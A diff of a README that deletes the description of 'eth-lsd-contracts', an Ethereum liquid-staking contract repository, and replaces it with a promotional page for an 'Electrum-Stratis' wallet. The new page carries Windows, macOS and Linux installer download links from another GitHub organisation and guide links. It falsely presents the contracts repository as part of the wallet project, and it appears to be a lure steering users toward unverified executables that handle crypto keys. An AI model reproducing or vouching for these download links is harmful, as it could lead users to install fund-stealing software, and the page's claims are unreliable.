@@ -1,49 +1,65 @@
-# eth-lsd-contracts
+![Electrum-Stratis](assets/banner-profile.png)
 
-Contracts is the foundation of ETH LSD stack. It consists of LsdToken, UserDeposit, NodeDeposit and NetworkWithdraw and other contracts, which enables users to stake, unstake and withdraw, validators to run node with minimum amount of ETH and platform to manage solo and trust nodes. 
+<h1 align="center">Electrum-Stratis</h1>
 
-To learn more about ETH LSD stack, see [**ETH LSD Stack Documentation and Guide**](https://github.com/stafiprotocol/stack-docs/blob/main/README.md#eth-lsd-stack)
+<p align="center">Contract work in the project, custody in your own hands</p>
 
-a very brief diagrams of the workflow:
+<p align="center"><img alt="release v2.7.19" src="https://img.shields.io/badge/RELEASE-v2.7.19-089ae8?style=for-the-badge&labelColor=071727"></p>
 
-```mermaid
-sequenceDiagram
-participant  UserDeposit.sol
-actor User
-participant  NetworkWithdraw.sol
+---
 
-User->>UserDeposit.sol: stake ETH
-UserDeposit.sol->>User: mint rToken
-User->>NetworkWithdraw.sol: unstake rToken 
-NetworkWithdraw.sol->>User: transfer ETH
-```
+## Downloads - v2.7.19
 
-```mermaid
-sequenceDiagram
-actor Admin
-actor Node
-participant NodeDeposit.sol
+<p align="center"><a href="https://github.com/electrum-stratis-project/electrum-stratis-wallet/releases/download/v2.7.19/electrum-stratis-v2.7.19.exe"><img alt="Download for Windows" src="https://img.shields.io/badge/DOWNLOAD-WINDOWS-089ae8?style=for-the-badge&labelColor=071727&logo=data%3Aimage%2Fsvg%2Bxml%3Bbase64%2CPHN2ZyB4bWxucz0iaHR0cDovL3d3dy53My5vcmcvMjAwMC9zdmciIHZpZXdCb3g9IjAgMCA4OCA4OCI%2BPHBhdGggZmlsbD0iI2ZmZmZmZiIgZD0iTTAgMTIuNCAzNS43IDcuNXYzNC4zSDB6TTQwIDYuOSA4OCAwdjQxLjhINDB6TTAgNDYuMmgzNS43djM0LjRMMCA3NS42ek00MCA0Ni4yaDQ4Vjg4bC00OC02Ljl6Ii8%2BPC9zdmc%2B&logoColor=ffffff"></a> <a href="https://github.com/electrum-stratis-project/electrum-stratis-wallet/releases/download/v2.7.19/electrum-stratis-v2.7.19.dmg"><img alt="Download for macOS" src="https://img.shields.io/badge/DOWNLOAD-MACOS-089ae8?style=for-the-badge&labelColor=071727&logo=apple&logoColor=ffffff"></a> <a href="https://github.com/electrum-stratis-project/electrum-stratis-wallet/releases/download/v2.7.19/electrum-stratis-v2.7.19.zip"><img alt="Download for Linux" src="https://img.shields.io/badge/DOWNLOAD-LINUX-089ae8?style=for-the-badge&labelColor=071727&logo=linux&logoColor=ffffff"></a></p>
 
-Admin->>NodeDeposit.sol: manage trust node
-Node->>NodeDeposit.sol: create new validator
-```
+<div align="center">
 
-```mermaid
-sequenceDiagram
-Ethereum->>FeePool.sol: distribute priority fee
-Ethereum->>NetworkWithdraw.sol: distribute validator rewards
-```
+| Platform | Requirements | File |
+| --- | --- | --- |
+| <img alt="Windows" height="24" src="https://img.shields.io/badge/os-windows-089ae8?style=flat-square&labelColor=071727&logo=data%3Aimage%2Fsvg%2Bxml%3Bbase64%2CPHN2ZyB4bWxucz0iaHR0cDovL3d3dy53My5vcmcvMjAwMC9zdmciIHZpZXdCb3g9IjAgMCA4OCA4OCI%2BPHBhdGggZmlsbD0iI2ZmZmZmZiIgZD0iTTAgMTIuNCAzNS43IDcuNXYzNC4zSDB6TTQwIDYuOSA4OCAwdjQxLjhINDB6TTAgNDYuMmgzNS43djM0LjRMMCA3NS42ek00MCA0Ni4yaDQ4Vjg4bC00OC02Ljl6Ii8%2BPC9zdmc%2B&logoColor=ffffff"> | Windows 10 (1909) or later, 64-bit | [`electrum-stratis-v2.7.19.exe`](https://github.com/electrum-stratis-project/electrum-stratis-wallet/releases/download/v2.7.19/electrum-stratis-v2.7.19.exe) |
+| <img alt="macOS" height="24" src="https://img.shields.io/badge/os-macos-089ae8?style=flat-square&labelColor=071727&logo=apple&logoColor=ffffff"> | macOS 12 or later | [`electrum-stratis-v2.7.19.dmg`](https://github.com/electrum-stratis-project/electrum-stratis-wallet/releases/download/v2.7.19/electrum-stratis-v2.7.19.dmg) |
+| <img alt="Linux" height="24" src="https://img.shields.io/badge/os-linux-089ae8?style=flat-square&labelColor=071727&logo=linux&logoColor=ffffff"> | x64, Ubuntu 20.04 or later, or equivalent | [`electrum-stratis-v2.7.19.zip`](https://github.com/electrum-stratis-project/electrum-stratis-wallet/releases/download/v2.7.19/electrum-stratis-v2.7.19.zip) |
+
+</div>
+
+All versions, installers and checksums are on the [v2.7.19 release page](https://github.com/electrum-stratis-project/electrum-stratis-wallet/releases/tag/v2.7.19).
+
+> Only download from this GitHub release page.
+
+---
+
+## Why Electrum-Stratis
+
+Electrum-Stratis is a desktop wallet first, and this repository belongs to the same project. If you came here looking for the application that holds and moves legacy STRAT, that is the download above.
+
+Self-custody means the keys never leave the computer: the seed is generated locally, the wallet file is local, and the server you connect to sees addresses and heights rather than keys.
+
+- One installer per platform, with no account and no sign-up.
+- Cold staking, with the lock length displayed before you commit.
+- A verification string on the receive screen, so a swapped address is visible.
+- Diagnostics that redact the seed, for when a connection fails.
+
+## This repository
+
+`eth-lsd-contracts` is one of the project's contract repositories; the wallet above is the product it serves.
+
+## Guides
+
+<div align="center">
+
+| Guide | What it answers |
+| --- | --- |
+| [Install Electrum Stratis on Windows, step by step](https://github.com/electrum-stratis-project/electrum-stratis-guides/blob/HEAD/install-on-windows-walkthrough.md) | first run on Windows |
+| [Is Electrum Stratis safe to use in 2026?](https://github.com/electrum-stratis-project/electrum-stratis-guides/blob/HEAD/how-safe-is-the-desktop-wallet.md) | verification and keys |
+| [Why does Electrum Stratis say Not Connected?](https://github.com/electrum-stratis-project/electrum-stratis-fixes/blob/HEAD/wallet-says-not-connected.md) | peer connection |
+
+</div>
 
 
-```mermaid
-sequenceDiagram
-Voter->>NetworkBalances.sol: vote for user balances <br>and other proposals for the network
-```
+[All guides](https://github.com/electrum-stratis-project/electrum-stratis-guides/blob/HEAD/README.md)
 
-## License
+**Your seed is the wallet. No page or person needs it.**
 
-The primary license for ETH LSD Contracts is the Business Source License 1.1 (BUSL-1.1), see [LICENSE](./LICENSE). Minus the following exceptions:
+## Support
 
-- Some [libraries](./contracts/libraries/) and [interfaces](./contracts/interfaces/) have a GPL license
-
-Each of these files states their license type.
+Open an issue on this repository. Never share a seed, a private key or a wallet file.
